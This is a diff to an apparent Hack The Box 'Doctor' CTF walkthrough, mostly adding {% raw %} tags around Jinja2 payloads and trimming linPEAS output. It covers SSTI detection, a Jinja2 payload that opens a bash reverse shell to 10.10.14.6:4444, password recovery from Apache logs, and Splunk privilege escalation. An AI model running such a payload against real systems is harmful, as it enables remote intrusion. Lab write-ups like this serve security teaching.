@@ -10,8 +10,8 @@ Hints: True
 | Step | User / Access | Technique Used | Result |
 |:---|:---|:---|:---|
 | 1 | (Local) | Nmap Scan, Directory & Virtual Host Enumeration | Identified open ports 22 (SSH), 80 (Apache), and 8089 (Splunk). Discovered a virtual host `doctors.htb` on port 80 which led to a login page with a registration feature. |
-| 2 | (Web) | Server-Side Template Injection (SSTI) or Command Injection | Registered a user on `doctors.htb`. Discovered an SSTI vulnerability by injecting `{{ 7*7 }}` into a new post's title field and observing the output on the `/archive` page. This confirmed the use of a templating engine (Jinja2/Twig). As a secondary method, it was found that the application was vulnerable to command injection via the post title field by observing a `curl` user agent interacting with a local server and then using `$(whoami)` to confirm command execution. |
-| 3 | web | Reverse Shell | **SSTI Method:** Used an SSTI payload `{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"').read()}}` in the post title to get a reverse shell. \<br\> **Command Injection Method:** Used `curl` to download and execute a reverse shell script, also obtaining a shell. |
+| 2 | (Web) | Server-Side Template Injection (SSTI) or Command Injection | Registered a user on `doctors.htb`. Discovered an SSTI vulnerability by injecting `{% raw %}{{ 7*7 }}{% endraw %}` into a new post's title field and observing the output on the `/archive` page. This confirmed the use of a templating engine (Jinja2/Twig). As a secondary method, it was found that the application was vulnerable to command injection via the post title field by observing a `curl` user agent interacting with a local server and then using `$(whoami)` to confirm command execution. |
+| 3 | web | Reverse Shell | **SSTI Method:** Used an SSTI payload {% raw %}`{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"').read()}}`{% endraw %} in the post title to get a reverse shell. \<br\> **Command Injection Method:** Used `curl` to download and execute a reverse shell script, also obtaining a shell. |
 | 4 | web | Log File Analysis | Found that the user `web` was a member of the `adm` group, which has read access to log files. By examining the `/var/log/apache2/backup` file, a password `Guitar123` was discovered from a password reset attempt for the user `shaun`. |
 | 5 | shaun | SSH Login | Used the password `Guitar123` to log in as the user `shaun` via SSH. |
 | 6 | root | Splunk Privilege Escalation (CVE-2020-10118) | Identified a running Splunk service on port 8089 as `root`. Used the `shaun` credentials to log in. Found that the Splunk version (8.0.5) was vulnerable to a remote code execution exploit (SplunkWhisperer2). Executed the exploit to gain a root shell. |
@@ -194,21 +194,25 @@ Probably if you are playing a CTF a Flask application will be related to STTI
 Se we can go to [SSTI Page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) and read some docs.
 As documented there, we can see that the attack is structured in three main phases: Detect, Identify and Exploit.  
 So first of all, we need to identify SSTI.  
-As we may have notice, when we insert an article, titles are shown into ```/archive```, so we can try to inject like ```{{ 7*7 }}``` and see what happens.  
+As we may have notice, when we insert an article, titles are shown into ```/archive```, so we can try to inject like {% raw %}`{{ 7*7 }}`{% endraw %} and see what happens.  
+{% raw %}
 ```
 <channel>
- 	<title>Archive</title>
- 	<item><title>49</title></item>
+    <title>Archive</title>
+    <item><title>49</title></item>
 </channel>
 ```
+{% endraw %}
 so we detected that the site is affected by an SSTI vulnerability.  
 Once we have detected the template injection potential, the next step is to identify the template engine.
 Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. We can follow the tree on [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), here, fuzzing the template engine we can discover what kind of exploit we can run against the application.
 Following the tree and testing all payloads, we can discover that in the backend the application is running Jinja2/twig application.  
 Now we can go to the exploit section, test all the available exploit for jinja2+python
+{% raw %}
 ```
 {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"').read()}}
 ```
+{% endraw %}
 We can upload our payload in title field, go to archive, and on our listener we can see:
 ```
 root@kali:~/Documents/HTB/Boxes/Doctor# nc -lvnp 4444
@@ -231,50 +235,19 @@ User & Groups: uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
 ```
 And hence can read log files:  
 ```
-╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                                                                                                                      
--rw-r----- 1 root adm 92 Sep 28  2020 /var/log/cups/error_log.1                                                                                                                                                                              
--rw-r----- 1 root adm 4736 Mai  4 10:12 /var/log/cups/access_log.1                                                                                                                                                                           
--rw-r----- 1 root adm 202 Sep 17  2020 /var/log/cups/access_log.7.gz                                                                                                                                                                         
--rw-r----- 1 root adm 256 Sep 23  2020 /var/log/cups/access_log.3.gz                                                  
--rw-r----- 1 root adm 0 Mai  4 10:12 /var/log/cups/error_log                                                          
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+-rw-r----- 1 root adm 92 Sep 28  2020 /var/log/cups/error_log.1
+-rw-r----- 1 root adm 4736 Mai  4 10:12 /var/log/cups/access_log.1
+-rw-r----- 1 root adm 202 Sep 17  2020 /var/log/cups/access_log.7.gz
+-rw-r----- 1 root adm 256 Sep 23  2020 /var/log/cups/access_log.3.gz
+-rw-r----- 1 root adm 0 Mai  4 10:12 /var/log/cups/error_log
 -rw-r----- 1 root adm 267 Sep 23  2020 /var/log/cups/access_log.2.gz
--rw-r----- 1 root adm 118 Sep 15  2020 /var/log/cups/error_log.2.gz                                                   
--rw-r----- 1 root adm 109 Aug 13  2020 /var/log/cups/error_log.3.gz                                                   
--rw-r----- 1 root adm 0 Mai  4 10:12 /var/log/cups/access_log                                                         
--rw-r----- 1 root adm 204 Sep 18  2020 /var/log/cups/access_log.6.gz                                                  
--rw-r----- 1 root adm 190 Sep 19  2020 /var/log/cups/access_log.5.gz                                                  
--rw-r----- 1 root adm 219 Sep 22  2020 /var/log/cups/access_log.4.gz                                                  
--rw-r----- 1 root adm 476 Sep  7  2020 /var/log/apache2/error.log.10.gz     
--rw-r----- 1 root adm 460 Sep 15  2020 /var/log/apache2/error.log.9.gz                                                
--rw-r----- 1 root adm 270 Aug 18  2020 /var/log/apache2/access.log.11.gz                                              
--rw-r----- 1 root adm 35844025 Mai  4 16:50 /var/log/apache2/error.log                                                
+-rw-r----- 1 root adm 118 Sep 15  2020 /var/log/cups/error_log.2.gz
+-rw-r----- 1 root adm 109 Aug 13  2020 /var/log/cups/error_log.3.gz
+-rw-r----- 1 root adm 0 Mai  4 10:12 /var/log/cups/access_log
 -rw-r----- 1 root adm 21578 Sep 17  2020 /var/log/apache2/backup
--rw-r----- 1 root adm 1493 Sep 23  2020 /var/log/apache2/access.log.2.gz
--rw-r----- 1 root adm 424 Sep 18  2020 /var/log/apache2/error.log.6.gz
--rw-r----- 1 root adm 3551 Sep 28  2020 /var/log/apache2/error.log.1
--rw-r----- 1 root adm 6626 Sep 28  2020 /var/log/apache2/access.log.1                                                 
--rw-r----- 1 root adm 230 Aug 21  2020 /var/log/apache2/error.log.14.gz                                               
--rw-r----- 1 root adm 846 Sep 22  2020 /var/log/apache2/error.log.3.gz
--rw-r----- 1 root adm 352 Sep 19  2020 /var/log/apache2/error.log.5.gz                                                
--rw-r----- 1 root adm 300825108 Mai  4 16:54 /var/log/apache2/access.log                                              
--rw-r----- 1 root adm 384 Sep 14  2020 /var/log/apache2/access.log.6.gz                   
--rw-r----- 1 root adm 3018 Sep  7  2020 /var/log/apache2/access.log.7.gz                                              
--rw-r----- 1 root adm 1338 Sep  6  2020 /var/log/apache2/access.log.8.gz                                              
--rw-r----- 1 root adm 428 Sep 17  2020 /var/log/apache2/error.log.7.gz                                                
--rw-r----- 1 root adm 1266 Sep  5  2020 /var/log/apache2/access.log.9.gz                                              
--rw-r----- 1 root adm 655 Sep 22  2020 /var/log/apache2/error.log.4.gz                                                
--rw-r----- 1 root adm 629 Sep 16  2020 /var/log/apache2/error.log.8.gz                                                
--rw-r----- 1 root adm 3951 Sep 22  2020 /var/log/apache2/access.log.3.gz                                              
--rw-r----- 1 root adm 1341 Sep 19  2020 /var/log/apache2/access.log.4.gz                                              
--rw-r----- 1 root adm 1092 Sep 23  2020 /var/log/apache2/error.log.2.gz                                               
--rw-r----- 1 root adm 341 Sep  5  2020 /var/log/apache2/error.log.13.gz                                               
--rw-r----- 1 root adm 680 Sep  5  2020 /var/log/apache2/error.log.12.gz                                               
--rw-r----- 1 root adm 323 Aug 21  2020 /var/log/apache2/access.log.10.gz                                              
--rw-r----- 1 root adm 537 Sep  6  2020 /var/log/apache2/error.log.11.gz                                               
--rw-r----- 1 root adm 664054 Sep 15  2020 /var/log/apache2/access.log.5.gz                                            
--rw-r----- 1 root adm 320 Sep  6  2020 /var/log/apt/term.log.1.gz                                                     
--rw-r----- 1 root adm 2932 Aug 13  2020 /var/log/apt/term.log.2.gz                                                    
--rw-r----- 1 root adm 0 Sep  7  2020 /var/log/apt/term.log
+-rw-r----- 1 root adm 35844025 Mai  4 16:50 /var/log/apache2/error.log
+-rw-r----- 1 root adm 300825108 Mai  4 16:54 /var/log/apache2/access.log
 ```
 Given this capability, let's try to look inside ```/var/log``` directory to see if we can find any sensitive information in here.  
 After few grep we can came up with:  
@@ -319,10 +292,10 @@ And we got user
 Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
 After we run linPEAS, we can notice that the splunk service we initially discovered is running as root:  
 ```
-╔════════════════════════════════════════════════╗              
-══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════          
- ╚════════════════════════════════════════════════╝                                                                                                                                                                 
-╔══════════╣ Cleaned processes                                                                                        
+╔════════════════════════════════════════════════╗
+══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
+ ╚════════════════════════════════════════════════╝
+╔══════════╣ Cleaned processes
 ╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
 [... SNIP ...]
 root        1138  0.0  2.1 257468 87936 ?        Sl   Mai04   0:46 splunkd -p 8089 start
